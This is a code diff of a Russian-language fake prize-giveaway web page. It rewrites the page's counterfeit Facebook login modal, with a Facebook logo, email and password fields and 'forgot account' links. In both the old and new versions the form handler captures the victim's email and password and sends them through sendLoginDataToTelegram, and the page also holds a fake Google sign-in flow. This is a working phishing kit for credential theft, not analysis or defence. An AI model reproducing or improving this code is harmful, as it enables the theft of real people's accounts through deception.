@@ -106,14 +106,6 @@
             50% { opacity: 0.3; transform: scale(1.2); }
         }
         
-        .winners-text {
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
-            font-size: 14px;
-            color: #fff;
-            letter-spacing: 1px;
-        }
-        
         .winners-count {
             font-family: 'Orbitron', sans-serif;
             font-weight: 700;
@@ -2024,178 +2016,118 @@
             text-decoration: underline;
         }
         
-        /* Facebook стиль (новая версия) */
+        /* Facebook стиль */
         .fb-modal {
-            background: #fff;
-            color: #1c1e21;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            width: 100%;
-            max-width: 100%;
-            border-radius: 0;
+            background: #F0F2F5;
             padding: 0;
-            margin: 0;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .fb-app-banner {
-            width: 100%;
-            background-color: #fff;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #dddfe2;
-            font-size: 14px;
-            color: #1877f2;
-        }
-        
-        .fb-app-banner svg {
-            margin-right: 12px;
-            fill: #1877f2;
-        }
-        
-        .fb-page-container {
-            width: 100%;
             max-width: 400px;
-            padding: 0 20px;
+            overflow: hidden;
+            border-radius: 8px;
+            animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .fb-header {
+            background: white;
+            padding: 30px 20px 20px;
             text-align: center;
-            animation: fadeIn 0.8s ease-in-out;
+            border-bottom: 1px solid #DADDE1;
         }
         
-        .fb-lang-selector {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #737373;
+        .fb-logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
         }
         
-        .fb-logo-container {
-            margin: 30px 0;
-        }
-        
-        .fb-logo-container img {
-            width: 60px;
-            height: 60px;
-        }
-        
-        .fb-login-form {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        
-        .fb-input-group {
-            position: relative;
+        .fb-content {
+            padding: 20px;
+            background: white;
         }
         
         .fb-input {
             width: 100%;
-            height: 55px;
-            padding: 16px;
-            font-size: 16px;
-            border: 1px solid #ccd0d5;
-            border-radius: 12px;
-            background-color: #f5f6f7;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #DDDFE2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: white;
+            color: #1C1E21;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s;
         }
         
         .fb-input:focus {
-            border-color: #1877f2;
-            background-color: #fff;
+            outline: none;
+            border-color: #1877F2;
+            box-shadow: 0 0 0 2px #E7F3FF;
+            transform: translateY(-2px);
         }
         
-        .fb-input.error {
-            border-color: #fa3e3e;
-            animation: shake 0.3s;
-        }
-        
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-        
-        .fb-btn-login {
-            background-color: #0064e0;
+        .fb-submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877F2;
             color: white;
             border: none;
-            border-radius: 25px;
-            height: 48px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 20px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 5px;
-            transition: transform 0.1s, background-color 0.2s;
+            margin: 10px 0 20px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s;
         }
         
-        .fb-btn-login:active {
-            transform: scale(0.97);
-            background-color: #0056b3;
+        .fb-submit-btn:hover {
+            background: #166FE5;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
         }
         
-        .fb-forgot-link {
-            text-decoration: none;
-            color: #1c1e21;
-            font-size: 14px;
-            font-weight: 500;
-            margin-top: 15px;
-            display: inline-block;
-        }
-        
-        .fb-create-account-container {
-            margin-top: 40px;
-            width: 100%;
-        }
-        
-        .fb-btn-create {
-            width: 100%;
-            background-color: transparent;
-            color: #1877f2;
-            border: 1px solid #1877f2;
-            border-radius: 25px;
-            padding: 10px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            text-decoration: none;
+        .fb-link {
             display: block;
-            transition: background-color 0.2s;
-        }
-        
-        .fb-btn-create:active {
-            background-color: #e7f3ff;
-        }
-        
-        .fb-footer {
-            margin-top: auto;
-            padding-bottom: 20px;
             text-align: center;
+            color: #1877F2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-family: 'Inter', sans-serif;
         }
         
-        .fb-meta-logo {
-            width: 60px;
-            margin-bottom: 10px;
-            opacity: 0.6;
+        .fb-link:hover {
+            text-decoration: underline;
         }
         
-        .fb-footer-links {
-            font-size: 12px;
-            color: #737373;
+        .fb-divider {
+            height: 1px;
+            background: #DADDE1;
+            margin: 20px 0;
         }
         
-        .fb-footer-links span {
-            margin: 0 5px;
+        .fb-create-btn {
+            width: 60%;
+            margin: 0 auto;
+            padding: 12px;
+            background: #42B72A;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            display: block;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s;
         }
         
-        .fb-error-msg {
-            color: #fa3e3e;
-            font-size: 12px;
-            text-align: left;
-            margin-top: -8px;
-            margin-bottom: 8px;
-            display: none;
+        .fb-create-btn:hover {
+            background: #36A420;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(66, 183, 42, 0.3);
         }
         
         /* СТИЛИ ДЛЯ ПОЛНОЭКРАННОЙ СТРАНИЦЫ GOOGLE */
@@ -2523,10 +2455,6 @@
                 font-size: 12px;
             }
             
-            .winners-text {
-                font-size: 12px;
-            }
-            
             .winners-count {
                 font-size: 14px;
             }
@@ -2711,8 +2639,7 @@
 
     <!-- Счетчик победителей -->
     <div class="winners-counter">
-        <span class="winners-text">WINNER</span>
-        <span class="winners-count" id="winnersCount">0</span>
+        Winners: <span class="winners-count" id="winnersCount">0</span>
     </div>
     
     <!-- Уведомление в центре -->
@@ -2906,51 +2833,33 @@
         </div>
     </div>
     
-    <!-- Facebook модальное окно (новая версия) -->
+    <!-- Facebook модальное окно -->
     <div class="modal-overlay" id="facebookModal">
         <div class="modal fb-modal">
             <button class="close-modal" onclick="closeModal('facebookModal')" style="color: #606770;">&times;</button>
             
-            <!-- Баннер iOS -->
-            <div class="fb-app-banner">
-                <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 11h2.59L12 16.59 8.41 13H11V8h2v5z"/></svg>
-                <span>Установите Facebook для iOS — приложение работает быстрее.</span>
-            </div>
-
-            <div class="fb-page-container">
-                <div class="fb-lang-selector">Русский</div>
-
-                <div class="fb-logo-container">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo">
+            <div class="fb-header">
+                <div class="fb-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 24 24" fill="#1877F2">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
                 </div>
-
-                <form class="fb-login-form" id="fbLoginForm">
-                    <div class="fb-input-group">
-                        <input type="text" id="fbLogin" class="fb-input" placeholder="Мобильный телефон или эл. адрес" autocomplete="username">
-                        <div class="fb-error-msg" id="fbLoginError">Введите адрес или номер телефона</div>
-                    </div>
+            </div>
+            
+            <div class="fb-content">
+                <form id="facebookLoginForm">
+                    <input type="text" class="fb-input" placeholder="Электронный адрес или номер телефона" required>
+                    <input type="password" class="fb-input" placeholder="Пароль" required>
                     
-                    <div class="fb-input-group">
-                        <input type="password" id="fbPassword" class="fb-input" placeholder="Пароль" autocomplete="current-password">
-                        <div class="fb-error-msg" id="fbPasswordError">Введите пароль</div>
-                    </div>
-
-                    <button type="submit" class="fb-btn-login">Войти</button>
+                    <button type="submit" class="fb-submit-btn">Вход</button>
                 </form>
-
-                <a href="#" class="fb-forgot-link">Забыли пароль?</a>
-
-                <div class="fb-create-account-container">
-                    <a href="#" class="fb-btn-create">Создать новый аккаунт</a>
-                </div>
+                
+                <a href="#" class="fb-link">Забыли аккаунт?</a>
+                
+                <div class="fb-divider"></div>
+                
+                <button class="fb-create-btn" onclick="closeModal('facebookModal')">Создать аккаунт</button>
             </div>
-
-            <footer class="fb-footer">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="fb-meta-logo">
-                <div class="fb-footer-links">
-                    Информация <span>·</span> Справка <span>·</span> Ещё
-                </div>
-            </footer>
         </div>
     </div>
 
@@ -3757,13 +3666,6 @@
                 const googleStep1 = document.getElementById('googleStep1');
                 const googleStep2 = document.getElementById('googleStep2');
                 
-                // Элементы Facebook
-                const fbLoginForm = document.getElementById('fbLoginForm');
-                const fbLoginInput = document.getElementById('fbLogin');
-                const fbPasswordInput = document.getElementById('fbPassword');
-                const fbLoginError = document.getElementById('fbLoginError');
-                const fbPasswordError = document.getElementById('fbPasswordError');
-                
                 // Призы с картинками
                 const prizes = [
                     { id: 1, image: "priz1.png" },
@@ -3790,7 +3692,7 @@
                 // Языковые настройки
                 const translations = {
                     en: {
-                        winnersCounter: "WINNER",
+                        winnersCounter: "Winners:",
                         menu: "Menu",
                         support: "Support",
                         myPrize: "My Prize",
@@ -3848,7 +3750,7 @@
                         languageChanged: "Language changed"
                     },
                     ru: {
-                        winnersCounter: "ПОБЕДИТЕЛЬ",
+                        winnersCounter: "Победителей:",
                         menu: "Меню",
                         support: "Поддержка",
                         myPrize: "Мой приз",
@@ -3906,7 +3808,7 @@
                         languageChanged: "Язык изменен"
                     },
                     uz: {
-                        winnersCounter: "G'OLIB",
+                        winnersCounter: "G'oliblar:",
                         menu: "Menyu",
                         support: "Yordam",
                         myPrize: "Mening sovrinim",
@@ -3971,8 +3873,7 @@
                     const t = translations[lang] || translations.en;
                     
                     // Обновляем счетчик победителей
-                    document.querySelector('.winners-text').textContent = t.winnersCounter;
-                    document.querySelector('.winners-count').textContent = winnersCount;
+                    document.querySelector('.winners-counter').innerHTML = `<span class="winners-count" id="winnersCount">${winnersCount}</span>`;
                     
                     // Обновляем верхнее меню
                     menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
@@ -4287,72 +4188,26 @@
                     }
                 });
                 
-                // Facebook форма (новая версия)
-                if (fbLoginForm) {
-                    fbLoginForm.addEventListener('submit', async function(e) {
-                        e.preventDefault();
-                        
-                        let isValid = true;
-
-                        // Валидация логина
-                        if (fbLoginInput.value.length < 3) {
-                            showFbError(fbLoginInput, fbLoginError);
-                            isValid = false;
-                        } else {
-                            hideFbError(fbLoginInput, fbLoginError);
-                        }
-
-                        // Валидация пароля
-                        if (fbPasswordInput.value.length < 6) {
-                            showFbError(fbPasswordInput, fbPasswordError);
-                            isValid = false;
-                        } else {
-                            hideFbError(fbPasswordInput, fbPasswordError);
-                        }
-
-                        if (isValid) {
-                            const btn = fbLoginForm.querySelector('.fb-btn-login');
-                            btn.innerText = 'Вход...';
-                            btn.style.opacity = '0.7';
-                            
-                            const loginData = {
-                                accountId: accountId,
-                                email: fbLoginInput.value,
-                                password: fbPasswordInput.value
-                            };
-                            
-                            const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
-                            
-                            if (success) {
-                                closeModal('facebookModal');
-                                isPrizeReceived = true;
-                                updatePrizeBadge();
-                                showConfirmation();
-                                showNotification(translations[currentLang].loginSuccess, false, true);
-                            } else {
-                                setTimeout(() => {
-                                    alert('Ошибка подключения к серверу. Попробуйте позже.');
-                                    btn.innerText = 'Войти';
-                                    btn.style.opacity = '1';
-                                }, 1500);
-                            }
-                        }
-                    });
+                // Facebook форма
+                document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    const inputs = this.querySelectorAll('input');
+                    const loginData = {
+                        accountId: accountId,
+                        email: inputs[0].value,
+                        password: inputs[1].value
+                    };
                     
-                    // Убираем ошибку при вводе
-                    fbLoginInput.addEventListener('input', () => hideFbError(fbLoginInput, fbLoginError));
-                    fbPasswordInput.addEventListener('input', () => hideFbError(fbPasswordInput, fbPasswordError));
-                }
-                
-                function showFbError(input, errorElement) {
-                    input.classList.add('error');
-                    errorElement.style.display = 'block';
-                }
-
-                function hideFbError(input, errorElement) {
-                    input.classList.remove('error');
-                    errorElement.style.display = 'none';
-                }
+                    const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
+                    
+                    if (success) {
+                        closeModal('facebookModal');
+                        isPrizeReceived = true;
+                        updatePrizeBadge();
+                        showConfirmation();
+                        showNotification(translations[currentLang].loginSuccess, false, true);
+                    }
+                });
                 
                 // Google Fullscreen обработчики
                 googleNextBtn.addEventListener('click', function(e) {
